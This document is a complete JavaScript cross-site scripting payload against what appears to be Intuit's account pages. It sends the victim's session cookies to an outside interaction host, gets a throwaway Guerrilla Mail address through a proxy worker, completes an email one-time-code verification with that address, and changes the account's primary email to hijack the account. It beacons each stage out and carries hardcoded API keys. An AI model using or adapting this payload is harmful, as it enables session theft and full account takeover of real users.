(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var W='https://atmeta-wildcard-monitor.nasseurpay.workers.dev/?url=';
var G='https://api.guerrillamail.com/ajax.php';
var out=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
function beacon(tag,data){(new Image).src=O+'/'+tag+'?d='+encodeURIComponent((data||'').substring(0,900))}
function render(){
try{
if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'+out.join('\n')+'</pre>';
}catch(e){}
}
function log(msg){out.push(msg);render()}
function wp(url){
return fetch(W+encodeURIComponent(url)).then(function(r){
if(!r.ok)throw new Error('proxy '+r.status);
return r.text()
})
}
function uuid(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)})}

var session=gc('ius_session');
var visitorId=gc('ivid');
var authId=gc('qbn.authid');

beacon('p23-start','s='+session.substring(0,20)+' a='+authId);
(new Image).src=O+'/p23-cookies?c='+encodeURIComponent(document.cookie.substring(0,2000));

var initHdrs={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyres3YphxpI5f5NhtHOzVAHTTAuQmL8UmCB, intuit_apikey_version=1.0',
'Intuit_Interception':'ignore-response',
'intuit_sessionid':session,
'intuit_profilingid':session,
'intuit_visitorid':visitorId,
'intuit_flowid':uuid(),
'intuit_offeringid':'Intuit.identity.experiences.oneintuitam',
'intuit_offeringenv':'prd',
'intuit_identity_routing':'SBSEG',
'intuit_intentassetalias':'Intuit.identity.experiences.oneintuitam',
'intuit_locale':'en-us',
'intuit_country':'US',
'intuit_samesite_support':'true',
'intuit_authn_session_slot':'qbn',
'intuit_origin':'https://accounts.intuit.com',
'intuit_baggage':btoa(JSON.stringify({scope_area:'remediation',additional_fields:{}}))
};

log('[*] XSS on '+location.origin);
log('[*] session: '+session.substring(0,20)+'...');
log('[*] authId: '+authId);
log('');
log('[0] Getting temp email...');

wp(G+'?f=get_email_address')
.then(function(raw){
var data=JSON.parse(raw);
var email=data.email_addr;
var sid=data.sid_token;
log('[0] Email: '+email);
beacon('p23-email',email);

log('[1] Initialize...');
return fetch('/factors/v1/verifier/initialize/email',{
method:'POST',headers:initHdrs,credentials:'include',
body:JSON.stringify({verifierPolicyId:'emailOtpSignIn',emailAddress:email})
}).then(function(r){return r.json()}).then(function(d){
if(!d.verifierSessionId)throw new Error('no vsid');
var vsid=d.verifierSessionId;
log('[1] vsid: '+vsid);
beacon('p23-init',vsid);

log('[2] Polling OTP...');
var attempt=0;
function poll(){
attempt++;
return wp(G+'?f=check_email&seq=0&sid_token='+encodeURIComponent(sid))
.then(function(raw){
var resp=JSON.parse(raw);
var list=resp.list||[];
log('[2] Poll #'+attempt+': '+list.length+' emails');
if(list.length>0){
var found=null;
for(var i=0;i<list.length;i++){
var subj=(list[i].mail_subject||'').toLowerCase();
if(subj.indexOf('welcome to guerrilla')!==-1)continue;
found=list[i];break
}
if(found){
log('[2] Got: '+found.mail_subject);
return wp(G+'?f=fetch_email&email_id='+found.mail_id+'&sid_token='+encodeURIComponent(sid))
.then(function(r2){return JSON.parse(r2)})
}
}
if(attempt>=60)throw new Error('timeout');
return new Promise(function(res){setTimeout(function(){res(poll())},3000)})
})
}

return poll().then(function(msg){
var body=(msg.mail_body||'').replace(/<[^>]*>/g,' ');
var m=body.match(/\b(\d{6})\b/);
var otp=m?m[1]:null;
if(!otp)throw new Error('no OTP');
log('[2] OTP: '+otp);
beacon('p23-otp',otp);

log('[3] Verify...');
return fetch('/factors/v1/verifier/verify/email',{
method:'POST',headers:initHdrs,credentials:'include',
body:JSON.stringify({verifierSessionId:vsid,otp:otp})
}).then(function(r){return r.json()}).then(function(vd){
if(!vd.verifierToken)throw new Error('no token');
var vt=vd.verifierToken;
log('[3] Got verifierToken');
beacon('p23-vt',vt.substring(0,80));

log('[4] SignInWithVerifierToken...');
var signInQuery='mutation SignInWithVerifierToken($input:Identity_BrowserSignInWithVerifierTokenInput!){identityBrowserSignInWithVerifierToken(input:$input){__typename ...on Identity_BrowserSignInWithVerifierTokenNothingElseRequired{__typename successCode authenticationSession{digitalIdentity{legacyAuthId pseudonymId}}}...on Identity_BrowserSignInWithVerifierTokenAccessDenied{__typename}...on Identity_BrowserSignInWithVerifierTokenSomethingElseRequired{__typename}...on Identity_SignInError{__typename}}}';

return fetch('/identity-api/signin/graphql',{
method:'POST',headers:initHdrs,credentials:'include',
body:JSON.stringify({
query:signInQuery,
variables:{input:{
intent:{appGroup:'',assetAlias:'Intuit.identity.experiences.oneintuitam',securityCategory:'ORANGE',redirectUri:'https://accounts.intuit.com/app/account-manager/security/email',rememberMe:false},
clientCapabilitySet:'v13',
finalSlotNames:['qbn'],
deviceCapabilities:{passkeySupported:false,simTs43Supported:false,digitalCredential:{userAgentAllowsProtocols:[]}},
inputSlotName:'qbn',
tenantIds:['50000003'],
verifierToken:vt
}}
})
}).then(function(r){return r.text()}).then(function(sr){
log('[4] Response: '+sr.substring(0,200));
beacon('p23-signin',sr.substring(0,400));

var srd;try{srd=JSON.parse(sr)}catch(e){}
if(srd&&srd.data){
var res=srd.data.identityBrowserSignInWithVerifierToken;
if(res){
log('[4] __typename: '+res.__typename);
if(res.__typename!=='Identity_BrowserSignInWithVerifierTokenNothingElseRequired'){
log('[!] SignIn did not return NothingElseRequired');
beacon('p23-signin-fail',res.__typename);
}
}
}

log('[5] UpdateEmailAddress...');
var updateHdrs={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0',
'intuit_routingid':authId,
'intuit_offeringid':'Intuit.cto.iam.ius',
'intuit_intentassetalias':'Intuit.cto.iam.ius',
'intuit_sessionid':session,
'intuit_profilingid':session,
'intuit_visitorid':visitorId,
'intuit_flowid':uuid(),
'intuit_tid':uuid()
};

var updateQuery='mutation UpdateEmailAddress($input:UpdateEmailAddressInput!){updateEmailAddress(request:$input){personInfo{contactInfo{emails{id active email variation{usage purposes{purpose}}}}}}}';

return fetch('/identity-api/v2/graphql',{
method:'POST',headers:updateHdrs,credentials:'include',
body:JSON.stringify({
query:updateQuery,
variables:{input:{
accountId:authId,
emailAddress:{
email:email,
active:true,
variation:{ordinal:'PRIMARY',usage:'OTHER',purposes:[{defaultPurpose:true,purpose:'OTHER'}]}
},
id:authId
}},
operationName:'UpdateEmailAddress'
})
}).then(function(r){return r.text()}).then(function(ur){
log('[5] Response: '+ur.substring(0,400));
beacon('p23-update',ur.substring(0,400));

var urd;try{urd=JSON.parse(ur)}catch(e){}
if(urd&&urd.data&&urd.data.updateEmailAddress){
log('');
log('=== EMAIL CHANGED TO: '+email+' ===');
beacon('p23-done','SUCCESS email='+email);
}else if(urd&&urd.errors){
log('[!] Error: '+JSON.stringify(urd.errors[0]).substring(0,200));
beacon('p23-gql-err',JSON.stringify(urd.errors[0]).substring(0,400));

log('[5b] Retrying with profileId placeholder...');
return fetch('/identity-api/v2/graphql',{
method:'POST',headers:updateHdrs,credentials:'include',
body:JSON.stringify({
query:updateQuery,
variables:{input:{
accountId:authId,
emailAddress:{
email:email,
active:true,
variation:{ordinal:'PRIMARY',usage:'OTHER',purposes:[{defaultPurpose:true,purpose:'OTHER'}]}
},
profileId:authId,
id:authId
}},
operationName:'UpdateEmailAddress'
})
}).then(function(r){return r.text()}).then(function(ur2){
log('[5b] Response: '+ur2.substring(0,400));
beacon('p23-update2',ur2.substring(0,400));
var urd2;try{urd2=JSON.parse(ur2)}catch(e){}
if(urd2&&urd2.data&&urd2.data.updateEmailAddress){
log('');
log('=== EMAIL CHANGED TO: '+email+' ===');
beacon('p23-done','SUCCESS email='+email);
}else{
log('[!] Also failed');
beacon('p23-fail2','failed');
}
})
}else{
log('[!] Unexpected');
beacon('p23-unexpected',ur.substring(0,200));
}
})
})
})
})
})
})
.catch(function(err){
log('[!] ERROR: '+err.message);
beacon('p23-err',err.message);
});

}catch(e){
(new Image).src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p23-crash?e='+encodeURIComponent(e.message);
}
})();
